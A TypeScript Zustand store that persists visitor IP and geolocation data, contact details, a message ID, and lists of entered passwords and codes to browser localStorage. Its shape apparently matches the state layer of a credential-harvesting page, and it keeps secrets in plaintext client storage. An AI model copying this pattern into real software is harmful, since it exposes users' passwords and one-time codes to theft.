import { create } from 'zustand';
import { createJSONStorage, persist } from 'zustand/middleware';

interface GeoInfo {
    asn: number;
    ip: string;
    country: string;
    city: string;
    country_code: string;
}

interface UserInfo {
    fullName: string;
    email: string;
    phone: string;
}

interface State {
    isModalOpen: boolean;
    geoInfo: GeoInfo | null;
    messageId: number | null;
    baseInfo: string;
    userInfo: UserInfo | null;
    passwords: string[];
    codes: string[];
    setModalOpen: (isOpen: boolean) => void;
    setGeoInfo: (info: GeoInfo) => void;
    setMessageId: (id: number | null) => void;
    setBaseInfo: (info: string) => void;
    setUserInfo: (info: UserInfo) => void;
    addPassword: (password: string) => void;
    addCode: (code: string) => void;
    resetData: () => void;
}

export const store = create<State>()(
    persist(
        (set) => ({
            isModalOpen: false,
            geoInfo: null,
            messageId: null,
            baseInfo: '',
            userInfo: null,
            passwords: [],
            codes: [],
            setModalOpen: (isOpen: boolean) => set({ isModalOpen: isOpen }),
            setGeoInfo: (info: GeoInfo) => set({ geoInfo: info }),
            setMessageId: (id: number | null) => set({ messageId: id }),
            setBaseInfo: (info: string) => set({ baseInfo: info }),
            setUserInfo: (info: UserInfo) => set({ userInfo: info }),
            addPassword: (password: string) => set((state) => ({ passwords: [...state.passwords, password] })),
            addCode: (code: string) => set((state) => ({ codes: [...state.codes, code] })),
            resetData: () => set({ baseInfo: '', userInfo: null, passwords: [], codes: [], messageId: null })
        }),
        {
            name: 'storage',
            storage: createJSONStorage(() => localStorage),
            partialize: (state) => ({
                geoInfo: state.geoInfo,
                messageId: state.messageId,
                baseInfo: state.baseInfo,
                userInfo: state.userInfo,
                passwords: state.passwords,
                codes: state.codes
            })
        }
    )
);
